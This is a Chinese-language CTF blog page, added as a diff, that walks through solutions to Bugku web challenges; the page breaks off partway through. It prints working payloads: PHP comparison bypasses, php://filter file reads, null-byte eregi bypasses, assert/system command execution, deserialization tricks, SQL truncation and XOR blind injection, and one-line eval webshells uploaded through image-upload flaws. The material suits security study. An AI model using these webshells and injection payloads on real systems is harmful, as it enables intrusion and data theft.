@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Bugku Web总结(持续更新ing) |  の
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="の" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Bugku Web总结(持续更新ing)"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Bugku Web总结(持续更新ing)
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/" class="article-date">
+  <time datetime="2021-01-21T16:00:00.000Z" itemprop="datePublished">2021-01-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">5k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">21 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>Bugku对于入门CTF的小白还是挺适合的，新版的Bugku和旧版有些不同，而且此前也没有整理过ctf web的骚操作，正好借这个机会补一补，总结新版Bugku Web中典型题目的wp，和一些常用函数的介绍，以及基础绕过姿势的总结。</p>
+<p>ps：题目环境的flag可能随机生成，所以每道题的flag不一定固定！</p>
+<a id="more"></a>
+<hr>
+<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><p><strong>tip: 矛盾</strong></p>
+<p>题目要求GET参数num要满足两个条件：</p>
+<ul>
+<li>!is_numeric($num)</li>
+<li>$num==1</li>
+</ul>
+<p>即num不是数字，且num要等于1；利用php中弱相等符号(==)的特性，构造num=1a来绕过，轻松得到flag{d25c3c84d25fbc1e5d6b14ac16d2c941}</p>
+<hr>
+<h2 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h2><p><strong>tip: 文件包含</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $a &#x3D; @$_REQUEST[&#39;hello&#39;];</span><br><span class="line">    eval( &quot;var_dump($a);&quot;);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>由源码可知要对输入的参数进行var_dump操作，利用file函数构造payload，file()函数用于读取文件内容，将整个文件读入数组中。payload为?hello=file(‘flag.php’)，轻松得到flag{82450de31e54c7263e735f2be3619c66}</p>
+<hr>
+<h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><p><strong>tip: flag In the variable !</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;args&#39;]))&#123;</span><br><span class="line">    $args &#x3D; $_GET[&#39;args&#39;];</span><br><span class="line">    if(!preg_match(&quot;&#x2F;^\w+$&#x2F;&quot;,$args))&#123;</span><br><span class="line">        die(&quot;args error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>$args需要满足正则匹配/^\w+$/，然后执行var_dump操作，注意到var_dump中$args前还有一个$符号，根据提示猜测flag藏在全局变量GLOBALS中，构造payload为?args=GLOBALS，轻松得到flag{4ffb43bb1468970faace8bdbb0c5c59e}</p>
+<p>ps:</p>
+<ul>
+<li>对于/^\w+$/i，两端/ /表示开始和结束；^表示开始字符串；$表示结束字符串；\w表示包含[a-z，A-Z, _ , 0-9]；+表示一个或者多个\w；后面的i表示不区分大小写；</li>
+<li>在PHP中$GLOBALS的作用是：引用全局作用域中可用的全部变量;</li>
+</ul>
+<hr>
+<h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><p><strong>tip: 网站被黑了 黑客会不会留下后门</strong></p>
+<p>利用dirmap或其他工具扫描站点，找到shell.php页面，需要密码登录，利用密码字典和burpsuite进行爆破攻击，得到flag{d6ca23ac2b9ab6fd2f54c639ff5b4eb6}</p>
+<hr>
+<h2 id="社工-伪造"><a href="#社工-伪造" class="headerlink" title="社工-伪造"></a>社工-伪造</h2><p><strong>tip: 伪造信息</strong></p>
+<p>随便登录一个账号进去，在和小美的聊天窗输入flag，提示 “我只告诉我的男朋友，他说除了他谁能不能说哦。”，然后查看小美的空间，发现了小美的男朋友备注是 “小bug” 。</p>
+<p>OK了，可以开始伪造了，将自己的qq号昵称改为 “小bug” ，然后用昵称为 “小bug” 的账号登录，在聊天窗输入flag，就可以得到flag{9b6463a15d77d778e0bcab037b7b2e83}</p>
+<hr>
+<h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><p><strong>tip: flag在index里</strong></p>
+<p>进入题目点击链接(click me? no)，点击后注意到url变化为index.php?file=show.php，典型的文件包含，利用filter伪协议构造payload为?file=php://filter/read=convert.base64-encode/resource=index.php，读取后进行base64解码得到flag{89382da3663b64c9adfbd35a90c31981}</p>
+<hr>
+<h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><p><strong>tip: 备份是个好东西</strong></p>
+<p>根据提示备份直接下载index.php.bak文件，然后审计源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);</span><br><span class="line">$str &#x3D; substr($str,1);</span><br><span class="line">$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);</span><br><span class="line">parse_str($str);</span><br><span class="line">echo md5($key1);</span><br><span class="line"></span><br><span class="line">echo md5($key2);</span><br><span class="line">if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;</span><br><span class="line">    echo $flag.&quot;取得flag&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据源码可知对key字符串进行了过滤，可用kkeyey绕过；同时要求解析后的key1和key2值不同，但是md5相同。md5的绕过方法有很多种，这里介绍三种方法，一个是0e绕过弱相等，一个是利用数组绕过，还有一个md5碰撞，利用fastcoll生成两组md5相同的字符串；</p>
+<ul>
+<li>法一：利用md5的弱相等性，在弱比较里，0e开头的会被识别成科学计数法，结果均为0，可构造两个字符串的md5值都以0e开头，payload为?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a，即可得到flag{738457a5de32daabfaa435caea830c75}</li>
+<li>法二：md5无法处理数组，当遇到数组时会返回NULL，因此可以利用数组绕过(数组绕过可以绕过强判断===)</li>
+<li>法三：md5碰撞，利用fastcoll生成两段md5相等的文本(fastcoll.exe -p source.txt -o 1.txt 2.txt)，因为有乱码所以将这些字符串进行url编码处理，可以构造payload,kkeyey1和kkeyey2的值分别为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kkeyey1&#x3D;123%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%9F%05%08%F2%7C%D5N%A9%C8%D1o%ACD%0C%1Cy%C2-%B6%1F%2F%D8%8C%24%CA%7F%AEo%2A%93%E0j%E3%FF%C7%82%C4%9D%AB%CBm%3B%9C%A4A%80zu%B2%C1qf%00%F6%97J%D2%A7%40%7D%9F%5C2%CA%DA%0DC%0B%A1r%EC_%D826%E7%EC%1C%E9%C1%5E9Z%22%88%FF%8A%7C%D9%F3W%5B%10%CD%C1%9D%B9%B0.%04%92%83%B6%AA%9A%E7%B8b%B0%5EG%A8%CD%8Bm%9E%A2%EB%3B%A8%E4%86CO%C4+%93</span><br><span class="line"></span><br><span class="line">kkeyey2&#x3D;123%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%9F%05%08%F2%7C%D5N%A9%C8%D1o%ACD%0C%1Cy%C2-6%1F%2F%D8%8C%24%CA%7F%AEo%2A%93%E0j%E3%FF%C7%82%C4%9D%AB%CBm%3B%9C%A4%C1%80zu%B2%C1qf%00%F6%97J%D2%A7%C0%7D%9F%5C2%CA%DA%0DC%0B%A1r%EC_%D826%E7%EC%1C%E9%C1%5E9%DA%22%88%FF%8A%7C%D9%F3W%5B%10%CD%C1%9D%B9%B0.%04%92%83%B6%AA%9A%E7%B8b0%5EG%A8%CD%8Bm%9E%A2%EB%3B%A8%E4%86%C3O%C4+%93</span><br></pre></td></tr></table></figure>
+通过三种方法的payload都可得到flag{738457a5de32daabfaa435caea830c75}</li>
+</ul>
+<p>ps:总结几个常见的php函数，strstr()，substr()和parse_str()</p>
+<ul>
+<li>strstr(string,a,b)：其中string和a是必填，b为选填，作用为判度string中是否存在a，若存在返回a以及a后的全部字符，如strstr(“Hello world!”,”wo”)的输出为world! ;</li>
+<li>substr(string,start,length):其中string和start为必填，length为选填，函数返回值为string字符串从第start个字符起，往后length个字符，如substr(“Hello world”,1)的输出为ello world ;</li>
+<li>parse_str(string,array)：其中string为必填，array为选填，函数作用为把查询字符串解析到变量中。如parse_str(“name=Bill&amp;age=60”)作用是解析生成了两个变量$name=Bill和$age=60 ；</li>
+</ul>
+<hr>
+<h2 id="Web-20"><a href="#Web-20" class="headerlink" title="Web 20"></a>Web 20</h2><p><strong>tip: cookies欺骗</strong></p>
+<p>Bugku中有好几道脚本题，选择了这一道写个wp。进入页面后在url处发现疑点，filename为base64编码后的文件名，line为所在行数，作用为读取文件的第line行显示到页面中。于是乎，写个脚本读取index.php的所有行数，脚本如下所示；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">for i in range(50):</span><br><span class="line">    url&#x3D;f&quot;http:&#x2F;&#x2F;114.67.246.176:10508&#x2F;index.php?line&#x3D;&#123;str(i)&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot; </span><br><span class="line">    s&#x3D;requests.get(url)</span><br><span class="line">    print(s.text)</span><br></pre></td></tr></table></figure>
+<p>通过上面的脚本得到index.php的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);</span><br><span class="line">$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;</span><br><span class="line">if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);</span><br><span class="line">$file_list &#x3D; array(</span><br><span class="line">&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,</span><br><span class="line">&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,</span><br><span class="line">);</span><br><span class="line">if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;</span><br><span class="line">$file_list[2]&#x3D;&#39;keys.php&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa &#x3D; file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>审计源码发现需要设置cookie值margin=margin，将keys.php导入file_list数组中，然后通过filename和line来读取keys.php的内容，keys.php的base64编码为a2V5cy5waHA=，从而构造payload为?line=&amp;filename=a2V5cy5waHA=,并利用burpsuite修改cookie值为margin=margin后，得到flag{47a96001690bf176b7c935eb14c418cf}</p>
+<p>ps:总结一个intval()函数，返回值为获取变量的整数值</p>
+<hr>
+<h2 id="Web-21"><a href="#Web-21" class="headerlink" title="Web 21"></a>Web 21</h2><p><strong>tip: never never never give up!!!</strong></p>
+<p>查看页面源代码，提示1p.html，访问1p.html直接跳转到bugku官方url，通过burpsuite拦截1p.html的返回内容，发现base64编码字符串，进行base64解码，再进行url解码，得到源码，进行审计：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if(!$_GET[&#39;id&#39;]) &#x2F;&#x2F;id要求不为0</span><br><span class="line">&#123;</span><br><span class="line">	header(&#39;Location: hello.php?id&#x3D;1&#39;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">$a&#x3D;$_GET[&#39;a&#39;];</span><br><span class="line">$b&#x3D;$_GET[&#39;b&#39;];</span><br><span class="line">if(stripos($a,&#39;.&#39;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &#39;no no no no no no no&#39;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data &#x3D; @file_get_contents($a,&#39;r&#39;);</span><br><span class="line">if($data&#x3D;&#x3D;&quot;bugku is a nice plateform!&quot; and $id&#x3D;&#x3D;0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!&#x3D;4)   &#x2F;&#x2F;id要求弱等于0</span><br><span class="line">&#123;</span><br><span class="line">	$flag &#x3D; &quot;flag&#123;***********&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>审计源码，传递三个参数id,a,b,要满足a变量不包含.符号，a的值为”bugku is a nice plateform!” ，id的值要求非0，又要弱等于0，b的长度大于5，还要满足字符串 1114 要与字符串 111 连接变量 b 的第一个字符构成的正则表达式匹配，变量 b 的第一个字符不等于整型数 4。file_get_contents()函数中可以使用php://input,因此可以利用伪协议、弱相等、eregi截断漏洞构造payload为/hello.php?id=0a&amp;a=php://input&amp;b=%00abcde，并在body中传入”bugku is a nice plateform!”,得到flag{ff7c252041021ba54808125cc93d1d06}</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210123172757.png" alt="burpsuite改包"></p>
+<p>ps：总结两个个php函数，stripos()，和eregi()以及其绕过姿势</p>
+<ul>
+<li>stripos(string,find,start):其中string，hind为必填，start为选填，作用为查找find再string中第一次出现的位置，start为规定开始搜索的位置，如stripos(“You love php, I love php too!”,”PHP”)的返回值为9；</li>
+<li>eregi(a,string)：作用为判度string中是否存在a，且不区分大小写，如eregi(‘abc’,’b’)返回True；</li>
+<li>eregi绕过姿势：eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据，在url中可以用%00空字符的方式进行截断；</li>
+</ul>
+<hr>
+<h2 id="Web-22"><a href="#Web-22" class="headerlink" title="Web 22"></a>Web 22</h2><p><strong>tip: 送给大家一个过狗一句话 $poc=”a#s#s#e#r#t”; $poc_1=explode(“#”,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[‘s’])</strong></p>
+<p>将提示中的代码还原 <code>assert($_GET[&#39;s&#39;])</code> ,可知要通过get请求传递一个参数s，并进行assert操作，可以利用scandir函数或者system函数来获取flag：</p>
+<ul>
+<li>方法一：利用scandir函数和assert函数获取当前目录下的所有文件夹和文件，构造payload为?s=print_r(scandir(‘./‘))，</li>
+<li>方法二：利用system函数和assert函数获取当前目录下的所有文件夹和文件，构造payload为?s=system(‘ls’)；</li>
+</ul>
+<p>得到flag文件后直接在url访问，得到flag{fc7cad1203f0a19783eee71ae8e43379}</p>
+<p>ps: scandir()函数作用为列出指定目录中的所有文件和目录；system()函数用于执行系统命令；</p>
+<hr>
+<h2 id="xxx二手交易市场"><a href="#xxx二手交易市场" class="headerlink" title="xxx二手交易市场"></a>xxx二手交易市场</h2><p><strong>tip: 本人现实碰到的题目，无提示勿问</strong></p>
+<p>这道题的注册功能已经修复过了，最初版本的注册功能是无效的，还需要猜测账号和密码(123456)。。。</p>
+<p>注册一个账号登录，在头像位置存在文件上传漏洞，上传一个图片通过burpsuite抓包，数据以base64编码的数据流形式传输，将data:image/jpeg修改为data:image/php，文件上传成功且后缀变为php，可以通过data属性控制文件后缀，然后将一句话木马进行base64编码，替换图片部分的数据流，<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code>的base64编码为<code>PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==</code>，因此构造payload为image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUW2NtZF0pOyA/Pg==，上传webshell后用蚁剑连接，在当前目录下得到flag{06add122126c9092268739112c89d62d}</p>
+<hr>
+<h2 id="冬至红包"><a href="#冬至红包" class="headerlink" title="冬至红包"></a>冬至红包</h2><p><strong>tip: 闪电十六鞭</strong></p>
+<p>审计源码，get传递的flag参数需要满足以下条件：</p>
+<ul>
+<li>flag变量长度等于$exam的长度，长度为49</li>
+<li>flag变量不能包含` , “ , . , \ , ( , ) , [ , ] , _ , flag , echo , print , require , include , die , exit ;</li>
+<li>eval($_GET[‘flag’]) === sha1($flag)</li>
+</ul>
+<p>其中第三点等于sha1可以利用短标签绕过判断，直接利用eval输出$flag变量的值，构造payload绕过对flag字符串的过滤，payload为<code>?flag=$a=&#39;blag&#39;;$a&#123;0&#125;=&#39;f&#39;;?&gt;11111111111111111;&lt;?=$$a;?&gt;</code>,得到flag{78062956} ；其中?&gt;用于闭合开头的&lt;?php 标记，111…111是用来填充长度的，</p>
+<p>ps: 总结一下短标签的用法。<code>&lt;?=$var?&gt;</code><br>和<code>&lt;?php echo $var; ?&gt;</code>的效果是一样的，用于输出某个变量；</p>
+<hr>
+<h2 id="Web-23"><a href="#Web-23" class="headerlink" title="Web 23"></a>Web 23</h2><p><strong>tip: 字符？正则？</strong></p>
+<p>要求get请求的参数id满足正则匹配<code>preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match)</code>，构造payload为?id=keykeyaaaakey:/a/keya:得到flag{eced261c98e527123293bc4c3c168c95}</p>
+<p>ps1:trim()函数：移除字符串两侧的空白字符或其他预定义字符。</p>
+<p>ps2:正则规则</p>
+<ul>
+<li>‘/xxxx/i’：两端的两个斜杠为开始和结束标记，i表示不区分大小写；</li>
+<li>. ：匹配任意一个字符(注意只能时一个字符)</li>
+<li>.* : 匹配任意多个任意字符(任意多个也可以是0个)</li>
+<li>{m,n} : 匹配m~n个任意字符(包含m，但不包含n)</li>
+<li>[a-z] : 匹配一个a-z之间的任意一个字符</li>
+<li>[[:punct:]]: 匹配一个特殊字符，如:,@,:等</li>
+</ul>
+<hr>
+<h2 id="Web-24"><a href="#Web-24" class="headerlink" title="Web 24"></a>Web 24</h2><p><strong>tip: 前女友</strong></p>
+<p>查看页面源代码，发现链接两个字会跳转到提示页面，进入提示页面后进行代码审计</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>md5绕过姿势在Web16已经介绍了，同时利用strcmp函数的漏洞，构造payload为?v1[]=1&amp;v2[]=2&amp;v3[]=1，即可得到flag{1f8906753838d5dd46af3f343d5b43f2}</p>
+<p>ps：strcmp ( string $str1 , string $str2 )介绍：</p>
+<ul>
+<li>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。在5.3之前的php中，当这个函数接受到了不符合的类型，显示了报错的警告信息后，将return 0 ，也就是虽然报了错，但却判定其相等了。因此可以利用数组绕过strcmp的判断。</li>
+</ul>
+<hr>
+<h2 id="Web-25"><a href="#Web-25" class="headerlink" title="Web 25"></a>Web 25</h2><p><strong>tip: SQL约束攻击</strong></p>
+<p>在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。</p>
+<ul>
+<li><p>在SQL中执行insert命令时，会受到字段长度的约束。例如以下，设置了name字段最大长度为8，当输入了长度大于8的字符串时如vampire123，insert命令会只截取前8位字符，最终插入数据位vampire1，如下图所示(经本地测试，这种情况存在于mysql 5.5.35版本，在mysql 5.7.23版本会报错)<br><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210126085705.png" alt="20210126085705"></p>
+</li>
+<li><p>在SQL中执SELECT处理时，字符串末尾的空格会被忽略。换句话说select * from users where name=”abc”等同于where name=”abc &nbsp;&nbsp;&nbsp;”；如下所示，在执行select查询时，返回了vampire1的结果，忽略了后面的空格，<br><img src="https://cdn.jsdelivr.net/gh/wxt406611016/cdn/image/20210126090046.png" alt="20210126090046"></p>
+</li>
+</ul>
+<p>这个题利用了这两个关键点，先通过注册，利用空格注册一个admin账户，如账号为”admin &nbsp;&nbsp;&nbsp;1”；(其中admin和1之间包含若干个空格))，再通过账号密码登录，即可获得flag{f2b6e02fcb3c729900f8255eb2777138}</p>
+<hr>
+<h2 id="Web-29"><a href="#Web-29" class="headerlink" title="Web 29"></a>Web 29</h2><p><strong>tip: 各种绕过</strong></p>
+<p>sha1绕过可以利用数组绕过强相等判断，和md5数组绕过方法相同，因此可构造payload为?id=margin&amp;uname[]=1，同时post请求passwd[]=2，即可得到flag{9cab7b5704ec4d45953c039c22ff4edd}</p>
+<hr>
+<h2 id="Web-34"><a href="#Web-34" class="headerlink" title="Web 34"></a>Web 34</h2><p><strong>tip: hint:文件包含</strong></p>
+<p>查看页面源代码，发现提示访问upload.php，经测试能够图片马，结合提示图片马+文件包含getshell，经测试&lt;?php和?&gt;被过滤了，使用如下payload为<code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[cmd])&lt;/script&gt;</code>成功上传webshell，蚁剑连接在根目录得到flag{1039c22c0a08a1523629a64d2b1382ea}</p>
+<hr>
+<h2 id="Web-32"><a href="#Web-32" class="headerlink" title="Web 32"></a>Web 32</h2><p><strong>tip: 求getshell</strong></p>
+<p>这道题有三道题需要绕过:</p>
+<ul>
+<li>multipart/form-data: 后端会判断是否存在这个字段，如果存在则继续判断后缀，可用大写绕过如Multipart/form-data(个人猜测这一步是模仿防火墙的检测功能)</li>
+<li>后缀白名单：经测试php4在白名单里，可绕过</li>
+<li>type检测：将Content-Type改为image/jpeg，可绕过</li>
+</ul>
+<p>以上三处绕过后可成功上传php4文件，蚁剑连接，在根目录得到flag{875905e02b46bb7322456dafa67b82d0}，具体的后端检测函数可以蚁剑连接后查看源代码分析</p>
+<hr>
+<h2 id="安慰奖"><a href="#安慰奖" class="headerlink" title="安慰奖"></a>安慰奖</h2><p><strong>tip: flag{}</strong></p>
+<p>根据提示，下载index.php.bak审计源码，需要进行反序列化操作，且绕过wake_up()和cmd过滤，因此构造<br>payload为?code=O:3:”ctf”:3:{s:11:”%00*%00username”;s:5:”admin”;s:6:”%00*%00cmd”;s:12:”tac%20flag.php”;}，即可得到flag{Unser1alize_and_2CE_Add}</p>
+<p>ps: 介绍三个点，第一个是wake_up绕过，第二个是public，protect和private在序列化中的区别，第三个是读文件的命令：</p>
+<ul>
+<li>当成员属性数目大于实际数目时可绕过wakeup方法，如上述payload中”ctf”:3，实际上类ctf中的属性只有两个，而payload中设为3，即可绕过wake_up；</li>
+<li>Public属性序列化后格式:成员变量名；Private属性序列化后格式:%00类名%00成员变量名；Protected属性序列化后的格式:%00*%00成员变量名</li>
+<li>linux中读取文件的命令：cat | tac | more | less | head | tail |nl 等</li>
+</ul>
+<hr>
+<h2 id="Web-36"><a href="#Web-36" class="headerlink" title="Web 36"></a>Web 36</h2><p><strong>tip: 全都过滤了绝望吗?</strong></p>
+<p>登录后先根据<br><a target="_blank" rel="noopener" href="https://wxt123.top/downloads/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E5%AD%97%E5%85%B8/sqlfuzz.txt">sql-fuzz字典</a>和burpsuite的返回长度进行fuzz测试看过滤了哪些字符串，经测试逗号被过滤了，但异或符号 ^ 还可以使用，当uname输入非admin时，返回值都为username error，当uname输入admin时，返回值为password error，说明用户名为amdin，接下来开始利用异或注入：</p>
+<ul>
+<li><p>判断密码长度：<code>uname=admin&#39;^(length(passwd)=32)^&#39;</code></p>
+<p>最后的 ‘ 用来闭合原本的右括号，这个结果返回empty，因此页面显示username error；分析返回结果时需要注意sql运算符的优先级， ^ &gt; = ，所以先进行异或运算，最后进行比较运算，且字符串与数字做异或运算时，会先进行类型转换，如’admin’^1相当于0^1；此题中，’admin’相当于0，(length(passwd)=32)相当于1，’’相当于0，所以0^1^0为1，最后进行uname的比较运算，即在数据库中匹配uname=1的数据，而数据库中的uname为’admin’，在进行’admin’=1比较时，’admin’先转换成整型0，0=1为false，所以返回empty。</p>
+<p>同理，当payload中密码长度修改为31时，异或运算相当于0^0^0，结果为0，在做比较运算时，uname=0，而’admin’转化为0，0=0为true，则查询成功，uname绕过了，因此页面显示passwd error；故可以通过这一点判断密码长度为32；猜测密码为md5密文；</p>
+</li>
+<li><p>判断密码每一位字符：<code>uname=admin&#39;^(ascii(substr((passwd)from(1))=52)^&#39;</code><br>用于判读密码第一位的字符(注意mysql和php不同，substr的第一位不是从0开始，而是1)；substr((passwd)from(1))利用了括号绕过逗号，相当于substr(passwd,1)。和判断密码长度的原理相同，当密码第一位判断正确时，返回username error，错误时返回passwd error，根据返回结果的不同爆破出32位密码，脚本如下：</p>
